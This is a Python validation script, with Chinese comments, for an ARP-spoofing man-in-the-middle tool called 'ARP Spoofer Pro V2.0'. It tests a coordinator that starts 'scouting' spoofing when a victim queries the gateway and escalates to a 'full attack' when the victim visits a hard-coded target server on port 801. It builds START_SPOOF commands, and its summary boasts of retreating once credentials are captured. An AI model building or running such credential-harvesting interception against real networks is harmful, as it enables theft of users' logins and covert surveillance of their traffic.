#!/usr/bin/env python3
"""
简化的系统验证脚本
验证分级递进式攻击系统的核心功能
"""

import sys
import os
import time
import json
from pathlib import Path

# 添加python_supervisor到路径
sys.path.insert(0, str(Path(__file__).parent / "python_supervisor"))

def test_basic_imports():
    """测试基本导入"""
    print("🔧 测试基本模块导入...")
    try:
        from config import Config, AttackConfig, AttackStrategyConfig
        from state_cache import StateCache, AttackSession
        from attack_coordinator import AttackCoordinator, AttackDecision
        print("✅ 所有模块导入成功")
        return True
    except Exception as e:
        print(f"❌ 模块导入失败: {e}")
        import traceback
        traceback.print_exc()
        return False

def test_config_loading():
    """测试配置加载"""
    print("\n🔧 测试配置加载...")
    try:
        from config import Config
        
        config = Config.load_from_file("config/config.yaml")
        print("✅ 配置文件加载成功")
        
        # 验证分级攻击策略配置
        strategy = config.attack.strategy
        print(f"   侦察时间: {strategy.scouting_duration}s")
        print(f"   全面攻击时间: {strategy.full_attack_duration}s")
        print(f"   高价值端口: {strategy.high_value_ports}")
        
        return True
    except Exception as e:
        print(f"❌ 配置加载失败: {e}")
        return False

def test_state_cache():
    """测试状态缓存"""
    print("\n🔧 测试状态缓存...")
    try:
        from state_cache import StateCache
        
        cache = StateCache()
        test_ip = "192.168.1.100"
        
        # 测试侦察会话
        print("   测试侦察会话...")
        cache.start_attack_session(test_ip, 60, 'scouting')
        
        attack_info = cache.get_attack_info(test_ip)
        if attack_info:
            print(f"   ✓ 攻击类型: {attack_info['attack_type']}")
            print(f"   ✓ 持续时间: {attack_info['duration']}s")
        
        # 测试攻击升级
        print("   测试攻击升级...")
        cache.upgrade_attack_session(test_ip, 60, 'full_attack')
        
        updated_info = cache.get_attack_info(test_ip)
        if updated_info and updated_info['attack_type'] == 'full_attack':
            print("   ✓ 攻击升级成功")
        
        print("✅ 状态缓存测试通过")
        return True
    except Exception as e:
        print(f"❌ 状态缓存测试失败: {e}")
        return False

def test_attack_coordinator():
    """测试攻击协调器"""
    print("\n🔧 测试攻击协调器...")
    try:
        from config import Config
        from state_cache import StateCache
        from attack_coordinator import AttackCoordinator
        
        config = Config.load_from_file("config/config.yaml")
        cache = StateCache()
        coordinator = AttackCoordinator(config, cache)
        
        # 测试高价值事件检测
        print("   测试高价值事件检测...")
        
        # 模拟目标服务器访问
        is_high_value_1 = coordinator._is_high_value_event("121.248.150.37", 80)
        print(f"   ✓ 目标服务器访问: {is_high_value_1}")
        
        # 模拟高价值端口访问
        is_high_value_2 = coordinator._is_high_value_event("192.168.1.1", 801)
        print(f"   ✓ 高价值端口801: {is_high_value_2}")
        
        # 模拟普通流量
        is_high_value_3 = coordinator._is_high_value_event("8.8.8.8", 53)
        print(f"   ✓ 普通流量(应为False): {is_high_value_3}")
        
        if is_high_value_1 and is_high_value_2 and not is_high_value_3:
            print("✅ 攻击协调器测试通过")
            return True
        else:
            print("❌ 高价值事件检测逻辑有误")
            return False
            
    except Exception as e:
        print(f"❌ 攻击协调器测试失败: {e}")
        return False

def test_decision_logic():
    """测试决策逻辑"""
    print("\n🔧 测试攻击决策逻辑...")
    try:
        from config import Config
        from state_cache import StateCache
        from attack_coordinator import AttackCoordinator
        
        config = Config.load_from_file("config/config.yaml")
        cache = StateCache()
        coordinator = AttackCoordinator(config, cache)
        
        # 模拟一个简单的分析结果类
        class MockAnalysis:
            def __init__(self, source_ip, packet_type, gateway_query=False, http_credentials=None, metadata=None):
                self.source_ip = source_ip
                self.packet_type = packet_type
                self.gateway_query = gateway_query
                self.http_credentials = http_credentials
                self.metadata = metadata or {}
        
        # 测试1: ARP网关查询 -> 应该启动侦察
        print("   测试ARP网关查询决策...")
        arp_analysis = MockAnalysis("192.168.1.100", "arp", gateway_query=True)
        decision = coordinator._handle_arp_analysis(arp_analysis)
        
        if decision and decision.action == 'attack' and decision.attack_type == 'scouting':
            print(f"   ✓ ARP决策正确: 启动{decision.duration}s侦察")
        else:
            print("   ❌ ARP决策错误")
            return False
        
        # 测试2: 侦察中的高价值HTTP -> 应该升级攻击
        print("   测试高价值事件升级决策...")
        # 先设置侦察状态
        cache.start_attack_session("192.168.1.100", 60, 'scouting')
        
        http_analysis = MockAnalysis(
            "192.168.1.100", 
            "http", 
            metadata={"dst_ip": "121.248.150.37", "dst_port": 801}
        )
        decision2 = coordinator._handle_http_analysis(http_analysis)
        
        if decision2 and decision2.action == 'attack' and decision2.attack_type == 'full_attack':
            print(f"   ✓ 升级决策正确: 升级为{decision2.duration}s全面攻击")
        else:
            print("   ❌ 升级决策错误")
            return False
        
        print("✅ 决策逻辑测试通过")
        return True
        
    except Exception as e:
        print(f"❌ 决策逻辑测试失败: {e}")
        import traceback
        traceback.print_exc()
        return False

def test_command_generation():
    """测试命令生成"""
    print("\n🔧 测试命令生成...")
    try:
        from attack_coordinator import AttackDecision
        
        # 测试侦察命令
        scouting_decision = AttackDecision(
            action='attack',
            target_ip='192.168.1.100',
            gateway_ip='192.168.1.1',
            duration=60,
            attack_type='scouting',
            reason='arp_gateway_query_for_scouting'
        )
        
        # 模拟命令生成
        command = {
            'type': 'START_SPOOF',
            'target_ip': scouting_decision.target_ip,
            'gateway_ip': scouting_decision.gateway_ip,
            'duration': scouting_decision.duration,
            'attack_type': scouting_decision.attack_type,
            'reason': scouting_decision.reason
        }
        
        print(f"   ✓ 侦察命令: {json.dumps(command, indent=2)}")
        
        # 测试升级命令
        upgrade_decision = AttackDecision(
            action='attack',
            target_ip='192.168.1.100',
            gateway_ip='192.168.1.1',
            duration=60,
            attack_type='full_attack',
            reason='high_value_event_detected'
        )
        
        upgrade_command = {
            'type': 'START_SPOOF',
            'target_ip': upgrade_decision.target_ip,
            'gateway_ip': upgrade_decision.gateway_ip,
            'duration': upgrade_decision.duration,
            'attack_type': upgrade_decision.attack_type,
            'reason': upgrade_decision.reason
        }
        
        print(f"   ✓ 升级命令: {json.dumps(upgrade_command, indent=2)}")
        
        print("✅ 命令生成测试通过")
        return True
        
    except Exception as e:
        print(f"❌ 命令生成测试失败: {e}")
        return False

def main():
    """主测试函数"""
    print("🧪 ARP Spoofer Pro V2.0 - 分级递进式攻击系统验证")
    print("=" * 70)
    
    tests = [
        test_basic_imports,
        test_config_loading,
        test_state_cache,
        test_attack_coordinator,
        test_decision_logic,
        test_command_generation
    ]
    
    passed = 0
    total = len(tests)
    
    for test in tests:
        try:
            if test():
                passed += 1
            else:
                print(f"测试失败: {test.__name__}")
        except Exception as e:
            print(f"测试异常: {test.__name__} - {e}")
    
    print("\n" + "=" * 70)
    print(f"📊 测试结果: {passed}/{total} 通过")
    
    if passed == total:
        print("🎉 所有测试通过！分级递进式攻击系统准备就绪！")
        print("\n💡 系统特性:")
        print("• 🕵️ 智能侦察模式 - 轻量级初始MiTM")
        print("• 🎯 高价值检测 - 自动识别关键目标行为")
        print("• ⬆️ 动态攻击升级 - 从侦察升级到全面攻击")
        print("• 🏆 精准撤退 - 捕获凭据后立即恢复")
        print("• ⏰ 自动定时管理 - 避免无效目标占用资源")
        print("\n🚀 可以使用以下命令启动系统:")
        print("   sudo python3 start_arp_pro_v2.py")
    else:
        print("❌ 部分测试失败，请检查代码修改")
        return 1
    
    return 0

if __name__ == "__main__":
    exit(main())
